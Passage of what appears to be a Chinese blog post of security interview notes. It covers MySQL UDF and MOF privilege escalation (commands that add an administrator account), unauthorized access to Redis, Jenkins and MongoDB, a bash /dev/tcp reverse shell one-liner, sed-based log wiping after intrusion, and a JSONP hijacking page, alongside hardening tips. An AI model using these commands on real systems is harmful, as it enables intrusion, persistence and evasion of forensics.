+<h1 id="提权"><a href="#提权" class="headerlink" title=" 提权"></a><span id="head63"> 提权</span></h1><h2 id="mysql两种提权方式"><a href="#mysql两种提权方式" class="headerlink" title=" mysql两种提权方式"></a><span id="head64"> mysql两种提权方式</span></h2><p>udf提权,mof提权</p>
+<h3 id="Mysql-UDF提权"><a href="#Mysql-UDF提权" class="headerlink" title=" Mysql_UDF提权"></a><span id="head65"> Mysql_UDF提权</span></h3><p>要求:<br>1.目标系统是Windows(Win2000,XP,Win2003)；<br>2.拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete权限以创建和抛弃函数<br>3.有root账号密码<br>导出udf:<br>MYSQL 5.1以上版本，必须要把udf.dll文件放到MYSQL安装目录下的lib\plugin文件夹下才能创建自定义函数<br>可以再mysql里输入<br><code>select @@basedir</code><br><code>show variables like ‘%plugins%’</code> 寻找mysql安装路径<br>提权:</p>
+<p>使用SQL语句创建功能函数。语法：Create Function 函数名（函数名只能为下面列表中的其中之一）returns string soname ‘导出的DLL路径’；</p>
+<pre><code>create function cmdshell returns string soname ‘udf.dll’
+select cmdshell(‘net user arsch arsch /add’);
+select cmdshell(‘net localgroup administrators arsch /add’);
+
+drop function cmdshell;</code></pre><p>该目录默认是不存在的，这就需要我们使用webshell找到MYSQL的安装目录，并在安装目录下创建lib\plugin文件夹，然后将udf.dll文件导出到该目录即可。</p>
+<h3 id="Mysql-mof提权"><a href="#Mysql-mof提权" class="headerlink" title="Mysql mof提权"></a><span id="head66">Mysql mof提权</span></h3><pre><code>#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)
+
+instance of __EventFilter as $EventFilter
+{
+EventNamespace = &quot;Root\\Cimv2&quot;;
+Name  = &quot;filtP2&quot;;
+Query = &quot;Select * From __InstanceModificationEvent &quot;
+&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;
+&quot;And TargetInstance.Second = 5&quot;;
+QueryLanguage = &quot;WQL&quot;;
+};
+
+instance of ActiveScriptEventConsumer as $Consumer
+{
+Name = &quot;consPCSV2&quot;;
+ScriptingEngine = &quot;JScript&quot;;
+ScriptText =
+&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user waitalone waitalone.cn /add\&quot;)&quot;;
+};
+
+instance of __FilterToConsumerBinding
+{
+Consumer   = $Consumer;
+Filter = $EventFilter;
+};</code></pre><p>其中的第18行的命令，上传前请自己更改。</p>
+<p>2、执行load_file及into dumpfile把文件导出到正确的位置即可。</p>
+<pre><code>select load file(&#39;c:/wmpub/nullevt.mof&#39;) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mov&#39;</code></pre><p>执行成功后，即可添加一个普通用户，然后你可以更改命令，再上传导出执行把用户提升到管理员权限，然后3389连接之就ok了。</p>
+<h1 id="特殊漏洞"><a href="#特殊漏洞" class="headerlink" title=" 特殊漏洞"></a><span id="head67"> 特殊漏洞</span></h1><h2 id="Struts2-045"><a href="#Struts2-045" class="headerlink" title=" Struts2-045"></a><span id="head68"> Struts2-045</span></h2><h2 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title=" Redis未授权访问"></a><span id="head69"> Redis未授权访问</span></h2><h3 id="产生原因"><a href="#产生原因" class="headerlink" title=" 产生原因"></a><span id="head70"> 产生原因</span></h3><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器</p>
+<h3 id="利用条件和方法"><a href="#利用条件和方法" class="headerlink" title=" 利用条件和方法"></a><span id="head71"> 利用条件和方法</span></h3><p>条件:</p>
+<ol>
+<li>redis服务以root账户运行</li>
+<li>redis无密码或弱密码进行认证</li>
+<li>redis监听在0.0.0.0公网上</li>
+</ol>
+<p>方法:</p>
+<ul>
+<li>通过 Redis 的 INFO 命令, 可以查看服务器相关的参数和敏感信息, 为攻击者的后续渗透做铺垫</li>
+<li>上传SSH公钥获得SSH登录权限</li>
+<li>通过crontab反弹shell</li>
+<li>slave主从模式利用</li>
+</ul>
+<h3 id="修复"><a href="#修复" class="headerlink" title=" 修复"></a><span id="head72"> 修复</span></h3><ul>
+<li>密码验证</li>
+<li>降权运行</li>
+<li>限制ip/修改端口</li>
+</ul>
+<h2 id="Jenkins未授权访问"><a href="#Jenkins未授权访问" class="headerlink" title=" Jenkins未授权访问"></a><span id="head73"> Jenkins未授权访问</span></h2><p>攻击者通过未授权访问进入脚本命令执行界面执行攻击指令</p>
+<p><code>println &quot;ifconfig -a&quot;.execute().text</code> 执行一些系统命令,利用wget下载webshell</p>
+<h2 id="MongoDB未授权访问"><a href="#MongoDB未授权访问" class="headerlink" title=" MongoDB未授权访问"></a><span id="head74"> MongoDB未授权访问</span></h2><p>开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,而且可以远程访问数据库，登录的用户可以通过默认端口无需密码对数据库进行增、删、改、查等任意高危操作。</p>
+<h3 id="防护-2"><a href="#防护-2" class="headerlink" title=" 防护"></a><span id="head75"> 防护</span></h3><p>1、为MongoDB添加认证：<br>1)MongoDB启动时添加–auth参数<br>2)给MongoDB添加用户：<br>use admin #使用admin库<br>db.addUser(“root”, “123456”) #添加用户名root密码123456的用户<br>db.auth(“root”,“123456”) #验证下是否添加成功，返回1说明成功<br>2、禁用HTTP和REST端口<br>MongoDB自身带有一个HTTP服务和并支持REST接口。在2.6以后这些接口默认是关闭的。mongoDB默认会使用默认端口监听web服务，一般不需要通过web方式进行远程管理，建议禁用。修改配置文件或在启动的时候选择–nohttpinterface 参数nohttpinterface=false<br>3、限制绑定IP<br>启动时加入参数<br>–bind_ip 127.0.0.1<br>或在/etc/mongodb.conf文件中添加以下内容：<br>bind_ip = 127.0.0.1</p>
+<h2 id="Memcache未授权访问"><a href="#Memcache未授权访问" class="headerlink" title=" Memcache未授权访问"></a><span id="head76"> Memcache未授权访问</span></h2><p>Memcached是一套常用的key-value缓存系统，由于它本身没有权限控制模块，所以对公网开放的Memcache服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取Memcached中的敏感信息。</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title=" 利用"></a><span id="head77"> 利用</span></h3><p>1、登录机器执行netstat -an |more命令查看端口监听情况。回显0.0.0.0:11211表示在所有网卡进行监听，存在memcached未授权访问漏洞。</p>
+<p>2、telnet 11211，或nc -vv 11211，提示连接成功表示漏洞存在</p>
+<h3 id="漏洞加固"><a href="#漏洞加固" class="headerlink" title=" 漏洞加固"></a><span id="head78"> 漏洞加固</span></h3><ul>
+<li>1、设置memchached只允许本地访问</li>
+<li>2、禁止外网访问Memcached 11211端口</li>
+<li>3、编译时加上–enable-sasl，启用SASL认证</li>
+</ul>
+<h2 id="FFMPEG-本地文件读取漏洞"><a href="#FFMPEG-本地文件读取漏洞" class="headerlink" title="FFMPEG 本地文件读取漏洞"></a><span id="head79">FFMPEG 本地文件读取漏洞</span></h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title=" 原理"></a><span id="head80"> 原理</span></h3><p>通过调用加密API将payload加密放入一个会被执行的段字节中。但是具体回答工程中我只回答道了SSRF老洞，m3u8头，偏移量，加密。</p>
+<h1 id="安全知识"><a href="#安全知识" class="headerlink" title=" 安全知识"></a><span id="head81"> 安全知识</span></h1><h2 id="WEB"><a href="#WEB" class="headerlink" title=" WEB"></a><span id="head82"> WEB</span></h2><h3 id="常用WEB开发JAVA框架"><a href="#常用WEB开发JAVA框架" class="headerlink" title=" 常用WEB开发JAVA框架"></a><span id="head83"> 常用WEB开发JAVA框架</span></h3><p>STRUTS,SPRING<br>常见的java框架漏洞<br>其实面试官问这个问题的时候我不太清楚他要问什么，我提到struts的045 048，java常见反序列化。<br>045 错误处理引入了ognl表达式<br>048 封装action的过程中有一步调用getstackvalue递归获取ognl表达式<br>反序列化 操作对象，通过手段引入。apache common的反射机制、readobject的重写，其实具体的我也记不清楚。。。然后这部分就结束了</p>
+<h3 id="同源策略"><a href="#同源策略" class="headerlink" title=" 同源策略"></a><span id="head84"> 同源策略</span></h3><p>同源策略限制不同源对当前document的属性内容进行读取或设置。<br>不同源的区分：协议、域名、子域名、IP、端口，以上有不同时即不同源。</p>
+<h3 id="Jsonp安全攻防技术，怎么写Jsonp的攻击页面？"><a href="#Jsonp安全攻防技术，怎么写Jsonp的攻击页面？" class="headerlink" title=" Jsonp安全攻防技术，怎么写Jsonp的攻击页面？"></a><span id="head85"> Jsonp安全攻防技术，怎么写Jsonp的攻击页面？</span></h3><h4 id="涉及到Jsonp的安全攻防内容"><a href="#涉及到Jsonp的安全攻防内容" class="headerlink" title=" 涉及到Jsonp的安全攻防内容"></a><span id="head86"> 涉及到Jsonp的安全攻防内容</span></h4><p>JSON劫持、Callback可定义、JSONP内容可定义、Content-type不为json。</p>
+<h4 id="攻击页面"><a href="#攻击页面" class="headerlink" title=" 攻击页面"></a><span id="head87"> 攻击页面</span></h4><p>JSON劫持，跨域劫持敏感信息，页面类似于</p>
+<pre><code>function wooyun(v){
+alert(v.username);
+}
+&lt;/script&gt;
+&lt;script src=&quot;http://js.login.360.cn/?o=sso&amp;m=info&amp;func=wooyun&quot;&gt;&lt;/script&gt;</code></pre><p>Content-type不正确情况下，JSONP和Callback内容可定义可造成XSS。<br>JSONP和FLASH及其他的利用参照知道创宇的JSONP安全攻防技术。</p>
+<h2 id="PHP"><a href="#PHP" class="headerlink" title=" PHP"></a><span id="head88"> PHP</span></h2><h3 id="php中命令执行涉及到的函数"><a href="#php中命令执行涉及到的函数" class="headerlink" title=" php中命令执行涉及到的函数"></a><span id="head89"> php中命令执行涉及到的函数</span></h3><p>1，代码执行：eval()、assert()、popen()、system()、exec()、shell_exec()、passthru(),pcntl_exec(),call_user_func_array(),create_function()<br>2，文件读取：file_get_contents(),highlight_file(),fopen(),read file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等<br>3，命令执行：system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</p>
+<h3 id="安全模式下绕过php的disable-fuction"><a href="#安全模式下绕过php的disable-fuction" class="headerlink" title="安全模式下绕过php的disable fuction"></a><span id="head90">安全模式下绕过php的disable fuction</span></h3><p>DL函数，组件漏洞，环境变量。</p>
+<h3 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title=" PHP弱类型"></a><span id="head91"> PHP弱类型</span></h3><p><code>==</code> 在进行比较的时候，会先将字符串类型转化成相同，再比较</p>
+<p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p>
+<p><code>0e</code>开头的字符串等于0</p>
+<h2 id="数据库"><a href="#数据库" class="headerlink" title=" 数据库"></a><span id="head92"> 数据库</span></h2><h3 id="各种数据库文件存放的位置"><a href="#各种数据库文件存放的位置" class="headerlink" title=" 各种数据库文件存放的位置"></a><span id="head93"> 各种数据库文件存放的位置</span></h3><p>mysql:<code>/usr/local/mysql/data/</code> <code>C:\ProgramData\MySQL\MySQL Server 5.6\Data\</code><br>oracle:<code>$ORACLE_BASE/oradata/$ORACLE_SID/</code></p>
+<h2 id="系统"><a href="#系统" class="headerlink" title=" 系统"></a><span id="head94"> 系统</span></h2><h3 id="如何清理日志"><a href="#如何清理日志" class="headerlink" title=" 如何清理日志"></a><span id="head95"> 如何清理日志</span></h3><p>meterpreter: <code>clearev</code></p>
+<h3 id="入侵-Linux-服务器后需要清除哪些日志？"><a href="#入侵-Linux-服务器后需要清除哪些日志？" class="headerlink" title="入侵 Linux 服务器后需要清除哪些日志？"></a><span id="head96">入侵 Linux 服务器后需要清除哪些日志？</span></h3><p>web日志，如apache的access.log,error.log。 直接将日志清除过于明显,一般使用sed进行定向清除</p>
+<p>e.g. sed -i -e ‘/192.169.1.1/d’</p>
+<p>history命令的清除，也是对~/.bash_history进行定向清除</p>
+<p>wtmp日志的清除，/var/log/wtmp</p>
+<p>登录日志清除 /var/log/secure</p>
+<h3 id="LINUX"><a href="#LINUX" class="headerlink" title=" LINUX"></a><span id="head97"> LINUX</span></h3><h4 id="查看当前端口连接的命令有哪些？netstat-和-ss-命令的区别和优缺点"><a href="#查看当前端口连接的命令有哪些？netstat-和-ss-命令的区别和优缺点" class="headerlink" title="查看当前端口连接的命令有哪些？netstat 和 ss 命令的区别和优缺点"></a><span id="head98">查看当前端口连接的命令有哪些？<code>netstat</code> 和 <code>ss</code> 命令的区别和优缺点</span></h4><pre><code>netstat -antp` `ss -l</code></pre><p>ss的优势在于它能够显示更多更详细的有关TCP和连接状态的信息，而且比netstat更快速更高效。</p>
+<h4 id="反弹-shell-的常用命令？一般常反弹哪一种-shell？为什么"><a href="#反弹-shell-的常用命令？一般常反弹哪一种-shell？为什么" class="headerlink" title="反弹 shell 的常用命令？一般常反弹哪一种 shell？为什么?"></a><span id="head99">反弹 shell 的常用命令？一般常反弹哪一种 shell？为什么?</span></h4><pre><code>bash -i&gt;&amp;/dev/tcp/x.x.x.x/4444 0&gt;&amp;1</code></pre><h4 id="通过Linux系统的-proc目录-，能够获取到哪些信息，这些信息可以在安全上有哪些应用？"><a href="#通过Linux系统的-proc目录-，能够获取到哪些信息，这些信息可以在安全上有哪些应用？" class="headerlink" title="通过Linux系统的/proc目录 ，能够获取到哪些信息，这些信息可以在安全上有哪些应用？"></a><span id="head100">通过Linux系统的/proc目录 ，能够获取到哪些信息，这些信息可以在安全上有哪些应用？</span></h4><pre><code>ls /proc</code></pre><p>系统信息，硬件信息，内核版本，加载的模块，进程</p>
+<h4 id="linux系统中，检测哪些配置文件的配置项，能够提升SSH的安全性。"><a href="#linux系统中，检测哪些配置文件的配置项，能够提升SSH的安全性。" class="headerlink" title=" linux系统中，检测哪些配置文件的配置项，能够提升SSH的安全性。"></a><span id="head101"> linux系统中，检测哪些配置文件的配置项，能够提升SSH的安全性。</span></h4><p><code>/etc/ssh/sshd___config</code><br>iptables配置</p>
+<h4 id="如何一条命令查看文件内容最后一百行"><a href="#如何一条命令查看文件内容最后一百行" class="headerlink" title=" 如何一条命令查看文件内容最后一百行"></a><span id="head102"> 如何一条命令查看文件内容最后一百行</span></h4><pre><code>tail -n 100 filename</code></pre><h3 id="Windows"><a href="#Windows" class="headerlink" title=" Windows"></a><span id="head103"> Windows</span></h3><h4 id="如何加固一个域环境下的Windows桌面工作环境？请给出你的思路。"><a href="#如何加固一个域环境下的Windows桌面工作环境？请给出你的思路。" class="headerlink" title=" 如何加固一个域环境下的Windows桌面工作环境？请给出你的思路。"></a><span id="head104"> 如何加固一个域环境下的Windows桌面工作环境？请给出你的思路。</span></h4><h2 id="密码学"><a href="#密码学" class="headerlink" title=" 密码学"></a><span id="head105"> 密码学</span></h2><h3 id="AES／DES的具体工作步骤"><a href="#AES／DES的具体工作步骤" class="headerlink" title=" AES／DES的具体工作步骤"></a><span id="head106"> AES／DES的具体工作步骤</span></h3><h3 id="RSA算法"><a href="#RSA算法" class="headerlink" title=" RSA算法"></a><span id="head107"> RSA算法</span></h3><p>加密:<br>$$<br>密文＝明文^EmodN<br>$$<br>RSA加密是对明文的E次方后除以N后求余数的过程</p>
+<p>$$<br>公钥＝(E,N)<br>$$<br>解密:</p>
+<p>$$<br>明文＝密文^DmodN<br>$$</p>
+<p>$$<br>私钥＝(D,N)<br>$$</p>
+<p>三个参数n,e1,e2</p>
+<p>n是两个大质数p,q的积</p>
+<h3 id="分组密码的加密模式"><a href="#分组密码的加密模式" class="headerlink" title=" 分组密码的加密模式"></a><span id="head108"> 分组密码的加密模式</span></h3><h3 id="如何生成一个安全的随机数？"><a href="#如何生成一个安全的随机数？" class="headerlink" title=" 如何生成一个安全的随机数？"></a><span id="head109"> 如何生成一个安全的随机数？</span></h3><p>引用之前一个学长的答案，可以通过一些物理系统生成随机数，如电压的波动、磁盘磁头读/写时的寻道时间、空中电磁波的噪声等。</p>
+<h3 id="SSL握手过程"><a href="#SSL握手过程" class="headerlink" title=" SSL握手过程"></a><span id="head110"> SSL握手过程</span></h3><p>建立TCP连接、客户端发送SSL请求、服务端处理SSL请求、客户端发送公共密钥加密过的随机数据、服务端用私有密钥解密加密后的随机数据并协商暗号、服务端跟客户端利用暗号生成加密算法跟密钥key、之后正常通信。<br>这部分本来是忘了的，但是之前看SSL Pinning的时候好像记了张图在脑子里，挣扎半天还是没敢确定，遂放弃。。。</p>
+<h3 id="对称加密与非对称加密的不同，分别用在哪些方面"><a href="#对称加密与非对称加密的不同，分别用在哪些方面" class="headerlink" title=" 对称加密与非对称加密的不同，分别用在哪些方面"></a><span id="head111"> 对称加密与非对称加密的不同，分别用在哪些方面</span></h3><h2 id="TCP-IP"><a href="#TCP-IP" class="headerlink" title=" TCP/IP"></a><span id="head112"> TCP/IP</span></h2><h3 id="TCP三次握手的过程以及对应的状态转换"><a href="#TCP三次握手的过程以及对应的状态转换" class="headerlink" title=" TCP三次握手的过程以及对应的状态转换"></a><span id="head113"> TCP三次握手的过程以及对应的状态转换</span></h3><p>（1）客户端向服务器端发送一个SYN包，包含客户端使用的端口号和初始序列号x;<br>（2）服务器端收到客户端发送来的SYN包后，向客户端发送一个SYN和ACK都置位的TCP报文，包含确认号xx1和服务器端的初始序列号y;<br>（3）客户端收到服务器端返回的SYNSACK报文后，向服务器端返回一个确认号为yy1、序号为xx1的ACK报文，一个标准的TCP连接完成。  </p>
+<h3 id="TCP和UDP协议区别"><a href="#TCP和UDP协议区别" class="headerlink" title=" TCP和UDP协议区别"></a><span id="head114"> TCP和UDP协议区别</span></h3><p>tcp面向连接,udp面向报文<br>tcp对系统资源的要求多<br>udp结构简单<br>tcp保证数据完整性和顺序，udp不保证</p>
+<h3 id="https的建立过程"><a href="#https的建立过程" class="headerlink" title=" https的建立过程"></a><span id="head115"> https的建立过程</span></h3><ul>
+<li>客户端发送请求到服务器端</li>
+<li>服务器端返回证书和公开密钥，公开密钥作为证书的一部分而存在</li>
+<li>客户端验证证书和公开密钥的有效性，如果有效，则生成共享密钥并使用公开密钥加密发送到服务器端</li>
+<li>服务器端使用私有密钥解密数据，并使用收到的共享密钥加密数据，发送到客户端</li>
+<li>客户端使用共享密钥解密数据</li>
+<li>SSL加密建立</li>
+</ul>
+<h2 id="流量分析"><a href="#流量分析" class="headerlink" title=" 流量分析"></a><span id="head116"> 流量分析</span></h2><h3 id="wireshark简单的过滤规则"><a href="#wireshark简单的过滤规则" class="headerlink" title=" wireshark简单的过滤规则"></a><span id="head117"> wireshark简单的过滤规则</span></h3><p><strong>过滤ip</strong>:</p>
+<p>过滤源ip地址:<code>ip.src==1.1.1.1;</code>,目的ip地址:<code>ip.dst==1.1.1.1;</code></p>
+<p><strong>过滤端口</strong>:</p>
+<p>过滤80端口:<code>tcp.port==80</code>,源端口:<code>tcp.srcport==80</code>,目的端口:<code>tcp.dstport==80</code></p>
+<p><strong>协议过滤</strong>:</p>
+<p>直接输入协议名即可,如http协议<code>http</code></p>
+<p><strong>http模式过滤</strong>:</p>
+<p>过滤get/post包<code>http.request.mothod==&quot;GET/POST&quot;</code></p>
+<h2 id="防火墙"><a href="#防火墙" class="headerlink" title=" 防火墙"></a><span id="head118"> 防火墙</span></h2><h3 id="简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。"><a href="#简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。" class="headerlink" title=" 简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。"></a><span id="head119"> 简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。</span></h3>
+        </div>
+        <!-- .entry-content -->
+        
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="alipay-code"><img src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/zfbqr.png"></li>
+                <li class="wechat-code"><img src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/wechatqr.png"></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+          
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+        
+          
+            <div class="post-nepre full next">
+          
+            <a href="/2020/05/30/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWEB/" rel="next">
+              <div class="background">
+                
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/44.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                攻防世界WEB</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
+      
+<div id="vcomments"></div>
+<script>
+  window.onload = function(){
+      var valine = new Valine();
+      valine.init({
+        el: '#vcomments',
+        appId: "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz",
+        appKey: "mgOpfzbkHYqU92CV4IDlAUHQ",
+        path: window.location.pathname,
+        placeholder: "你是我一生只会遇见一次的惊喜 ..."
+      })
+  }
+</script>
+
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+          <a href="https://ther.wang" target="_blank" rel="noopener" class="profile gravatar"><img src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/26.jpg" itemprop="image" alt="T1h2er3" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="https://ther.wang" target="_blank" itemprop="url" rel="author noopener">T1h2er3</a>
+            </h3>
+          </div>
+        </div>
+        <hr>
+        <p><i class="iconfont icon-write"></i></p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
+</div>
+
+
+    </div>    
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            // PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+    <!-- <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 T1h2er3<br>
+      powered_by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer> -->
+<footer id="colophon" class="site-footer" role="contentinfo">
+    <div class="site-info">
+        <div class="footertext">
+            <div class="img-preload">
+                <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/wordpress-rotating-ball-o.svg">
+                <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/disqus-preloader.svg">
+            </div>
+            
+                <p id="chakhsu"></p>
+            
+            <p>本站总访问量：<a id="allcount"></a></p>
+            <p style="color: #666666;">到底啦！</p>
+            
+                <p id="momk" style="font-family: 'Ubuntu', sans-serif;color: #b9b9b9;"></p>
+            
+        </div>
+        <div class="footer-device">
+            <p style="font-family: 'Ubuntu', sans-serif;">
+ <span style="">Theme <a href="https://github.com/xbclub/Hexo-theme-sakura" target="_blank"
+                         style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Sakura</a> <i
+             class="iconfont icon-sakura rotating" style="color: #ffc0cb;display:inline-block"></i> by <a
+             href="https://2heng.xin/" target="_blank"
+             style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Mashiro</a>&<a
+             href="https://www.hojun.cn/" target="_blank"
+             style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Hojun</a>&<a
+             href="https://42cloud.cn/" target="_blank"
+             style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">42team, Powered by Hexo</a>
+        </span>
+            </p>
+        </div>
+    </div><!-- .site-info -->
+</footer>
+
+
+<!--<script src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.7/js/tocbot.min.js"></script>-->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.8/js/lib.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.8/js/InsightSearch.js"></script>
+<script type="text/javascript"
+        src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.8/js/jquery.fancybox.min.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.8/js/zoom.min.js"></script>
+
+        <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@1.4/js/sakura-app.js"></script>
+
+<script src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.8/js/av-min.js"></script>
+<script src='https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.8/js/Valine.min.js'></script>
+<script src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.8/js/botui.js"></script>
+<!-- 不蒜子 网页计数器 -->
+
+      
+       <script>
+  fetch('https://counts.42cloud.cn/api/counts.html')
+        .then(response => response.json())
+        .then(data => {
+              if (document.getElementById("readcount")) {
+                document.getElementById("readcount").innerHTML=data.Count;
+            }
+            if (document.getElementById("allcount")){
+                document.getElementById("allcount").innerHTML=data.Allcount;
+            }
+        })
+        .catch(err => console.error(err))
+</script>
+      
+<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script> -->
+<script type="text/javascript">
+    /* <![CDATA[ */
+    if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+        var Poi = {
+            "pjax": "1",
+            "movies": {"url": "https://cdn.jsdelivr.net/gh/honjun/hojun@1.2", "name": "Unbroken.mp4", "live": "close"},
+            "windowheight": "fixed",
+            "codelamp": "close",
+            "ajaxurl": "",
+            "order": "asc",
+            "formpostion": "bottom"
+        };
+    } else {
+        var Poi = {
+            "pjax": "1",
+            "movies": {"url": "https://cdn.jsdelivr.net/gh/honjun/hojun@1.2", "name": "Unbroken.mp4", "live": "open"},
+            "windowheight": "auto",
+            "codelamp": "close",
+            "ajaxurl": "",
+            "order": "asc",
+            "formpostion": "bottom"
+        };
+    }
+    /* ]]> */
+
+</script>
+<script>
+    $(document).ready(function () {
+        if ($(".toc").length > 0 && document.body.clientWidth > 1200) {
+            if ($(".pattern-center").length > 0) { //有图的情况
+                tocbot.init({
+                    // Where to render the table of contents.
+                    tocSelector: '.toc', // 放置目录的容器
+                    // Where to grab the headings to build the table of contents.
+                    contentSelector: '.entry-content', // 正文内容所在
+                    // Which headings to grab inside of the contentSelector element.
+                    scrollSmooth: true,
+                    headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+                    headingsOffset: -400,
+                    scrollSmoothOffset: -85
+                });
+            } else {
+                tocbot.init({
+                    // Where to render the table of contents.
+                    tocSelector: '.toc', // 放置目录的容器
+                    // Where to grab the headings to build the table of contents.
+                    contentSelector: '.entry-content', // 正文内容所在
+                    // Which headings to grab inside of the contentSelector element.
+                    scrollSmooth: true,
+                    headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+                    headingsOffset: -85,
+                    scrollSmoothOffset: -85
+                });
+            }
+            var offsetTop = $('.toc').offset().top - 95;
+            window.onscroll = function () {
+                var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
+                if (scrollTop >= offsetTop) {
+                    $('.toc').addClass('toc-fixed');
+                } else {
+                    $('.toc').removeClass('toc-fixed');
+                }
+            }
+        }
+    });
+</script>
+
+    <script type="text/javascript">
+        function NewDate(str) {
+            str = str.split('-');
+            var date = new Date();
+            date.setUTCFullYear(str[0], str[1] - 1, str[2]);
+            date.setUTCHours(0, 0, 0, 0);
+            return date;
+        }
+
+        function momxc() {
+            var birthDay = NewDate("2019-6-16");
+            var today = new Date();
+            var timeold = today.getTime() - birthDay.getTime();
+            var sectimeold = timeold / 1000
+            var secondsold = Math.floor(sectimeold);
+            var msPerDay = 24 * 60 * 60 * 1000;
+            var e_daysold = timeold / msPerDay;
+            var daysold = Math.floor(e_daysold);
+            var e_hrsold = (daysold - e_daysold) * -24;
+            var hrsold = Math.floor(e_hrsold);
+            var e_minsold = (hrsold - e_hrsold) * -60;
+            var minsold = Math.floor((hrsold - e_hrsold) * -60);
+            var seconds = Math.floor((minsold - e_minsold) * -60).toString();
+            document.getElementById("momk").innerHTML = "本站已安全运行" + daysold + "天" + hrsold + "小时" + minsold + "分" + seconds + "秒";
